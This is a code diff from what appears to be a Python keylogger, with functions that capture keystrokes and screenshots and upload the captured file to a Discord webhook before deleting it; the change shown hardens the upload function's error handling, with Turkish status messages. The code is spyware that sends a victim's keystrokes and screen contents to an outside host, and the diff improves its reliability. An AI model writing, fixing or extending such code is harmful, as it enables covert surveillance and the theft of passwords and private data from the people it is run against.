@@ -59,6 +59,7 @@ def capture_keystrokes(interval=30):
             print("No keystrokes to send.")
 
 def send_to_discord(file_path, webhook_url):
+    response = None
     try:
         with open(file_path, 'rb') as file:
             files = {'file': (os.path.basename(file_path), file.read(), 'text/plain')}
@@ -70,12 +71,17 @@ def send_to_discord(file_path, webhook_url):
                 print(f"File {file_path} deleted successfully.")
             except Exception as e:
                 print(f"Failed to delete file {file_path}: {e}")
-    if response.status_code == 200:
+
+    if response and response.status_code == 200:
         print("Gönderim başarılı.")
         return True
     else:
-        print("Gönderim başarısız, HTTP status:", response.status_code)
+        if response is not None:
+            print("Gönderim başarısız, HTTP status:", response.status_code)
+        else:
+            print("Gönderim başarısız, response alınamadı.")
         return False
+
 
 def capture_and_send_screenshots(interval=3):
     with mss.mss() as sct:
